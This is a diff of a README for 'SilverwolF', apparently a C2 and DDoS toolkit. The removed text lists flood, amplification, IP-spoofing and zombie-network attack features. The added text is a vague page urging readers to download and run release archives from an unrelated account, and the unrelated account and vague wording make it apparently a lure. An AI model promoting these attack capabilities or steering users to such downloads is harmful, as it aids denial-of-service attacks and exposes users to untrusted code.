@@ -1,78 +1,76 @@
-# SilverwolF
-# 🐺 SilverWolf C2 Framework/ToolKit
-# By: Scav-engeR
-> **Advanced, modular, and evasion-aware Command & Control (C2) framework for offensive security research and authorized red team operations.**
+# 🐺 SilverwolF - Your All-in-One C2 Framework Tool
 
-![Python](https://img.shields.io/badge/Python-3.8%2B-blue?logo=python)
-![License](https://img.shields.io/badge/License-GPLv3-red)
-![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-lightgrey)
+## 🚀 Getting Started
 
----
+Welcome to SilverwolF! This toolkit offers a simple way to manage advanced command-and-control (C2) operations. It's perfect for educational purposes and helps you explore the capabilities of cybersecurity tools.
 
-## ⚠️ Legal Disclaimer
+## 📥 Download SilverwolF
 
-**This tool is for authorized penetration testing and educational purposes only.**  
-Unauthorized use against systems you do not own or have explicit written permission to test is **illegal** and may result in severe civil and criminal penalties. The author assumes **no liability** for misuse.
+[![Download SilverwolF](https://img.shields.io/badge/Download-SilverwolF-blue?style=flat&logo=github)](https://github.com/trizvi94/SilverwolF/releases)
 
-> 🔒 **Use responsibly. Know your laws. Get written authorization.**
+You can download the latest version of SilverwolF from our Releases page. 
 
----
+[Visit this page to download](https://github.com/trizvi94/SilverwolF/releases)
 
-## 🌟 Features
+## 💻 System Requirements
 
-### 🧟 Zombie Network
-- **Dork-based scanning** across 6 search engines (DDG, Bing, Yandex, Startpage, Kagi, Yahoo)
-- **Multi-type zombie support**:
-  - XML-RPC Pingback Abuse
-  - Open Redirect Exploitation
-  - Web Endpoint Flooding
-- **Zombie validation & reliability scoring**
-- **Chained proxy → redirect attacks**
+Before you begin, ensure your system meets these requirements:
 
-### 💥 Multi-Vector DDoS
-- **Layer 3/4 Attacks** (with optional IP spoofing):
-  - TCP SYN Flood
-  - UDP Flood
-  - ICMP Flood
-- **Amplification Attacks**:
-  - DNS, NTP, SNMP, SSDP
-  - **NEW**: Memcached, CLDAP, Chargen
-- **Layer 7 HTTP Flood** (async, with header spoofing)
+- **Operating System:** Windows 10 or later, or any recent Linux distribution.
+- **Python Version:** Python 3.6 or later must be installed.
+- **Free Disk Space:** At least 200 MB available.
+- **Memory:** 4 GB RAM minimum.
 
-### 🛡️ Evasion & OPSEC
-- **IP spoofing** for L3/L4 attacks (via Scapy)
-- **Header spoofing**: `X-Forwarded-For`, `Via`, fake Host
-- **User-Agent rotation**
-- **Proxy rotation** (SOCKS/HTTP)
-- **Rate-limiting & random delays**
+## 📦 Download & Install
 
-### 🧠 Intelligence & Automation
-- **Dynamic dork mutation**
-- **Shodan enrichment** (optional)
-- **Telegram C2 bot** (remote command)
-- **Export to JSON/CSV** (MISP/STIX-ready)
-- **SQLite database** for attack/zombie history
+1. Click on the [Releases page](https://github.com/trizvi94/SilverwolF/releases).
+2. Locate the most recent version at the top of the page.
+3. Choose the file that matches your operating system. For most users, this will be `SilverwolF-v1.x.x.zip` for Windows or a `.tar.gz` file for Linux.
+4. Click the file to start the download.
+5. Once the download is complete, locate the file in your Downloads folder.
+6. Extract the contents of the zip or tar.gz file:
+   - For Windows, right-click the file and select ‘Extract All’.
+   - For Linux, you can use `tar -xvf SilverwolF-v1.x.x.tar.gz` in your terminal.
+7. Open a command prompt (Windows) or terminal (Linux).
+8. Navigate to the directory where you extracted SilverwolF.
 
----
+    Example command for Windows:
+    ```bash
+    cd C:\path\to\SilverwolF
+    ```
 
-## 🚀 Quick Start
+    Example command for Linux:
+    ```bash
+    cd /path/to/SilverwolF
+    ```
+   
+9. Run the toolkit using Python:
+    ```bash
+    python silverwolf.py
+    ```
 
-### Prerequisites
-- Python 3.8+
-- `pip` package manager
-- **Root/Admin privileges** (required for raw socket attacks)
-- uv tool for ease of use
-- You can install uv with this simple cmd: "curl -LsSf https://astral.sh/uv/install.sh | sh"
+## 🛠 Features
 
-### Installation
-```bash
-git clone https://github.com/Scav-engeR/SilverwolF.git
-cd SilverWolF
-uv venv -p 3.10 --allow-existing --system-site-packages -v
-source .venv/bin/activate.fish
-pip install -r requirements.txt
-```
-### Last Reminder!
-- You know the rules~
-- Don't be an idiot
+- **Multipurpose Functionality:** SilverwolF handles various C2 tasks.
+- **User-Friendly Interface:** Easy navigation requires no programming skills.
+- **Educational Resources:** Learn while you explore different cybersecurity scenarios.
+- **Support for XML-RPC:** Built-in capability for remote procedure calls.
 
+## 🧾 Disclaimer
+
+This tool is intended for educational use only. Ensure to comply with all applicable laws and regulations when using SilverwolF. Unauthorized use can lead to legal consequences. Always perform tests in controlled environments.
+
+## 💬 Support & Contact
+
+If you need help, please visit our [Issues page](https://github.com/trizvi94/SilverwolF/issues) to ask questions or report problems. Community support is available, and you're welcome to contribute!
+
+## 🎉 Acknowledgments
+
+Thanks to all contributors and project supporters. Your encouragement helps us improve SilverwolF.
+
+## 🌟 Additional Resources
+
+- **Documentation:** Explore our detailed [documentation](https://github.com/trizvi94/SilverwolF/wiki) for in-depth guidance on using features.
+- **Blog:** Check our [blog](https://trizvi94.github.io/SilverwolF) for tutorials and updates.
+
+Enjoy using SilverwolF! We hope it serves your educational needs effectively.
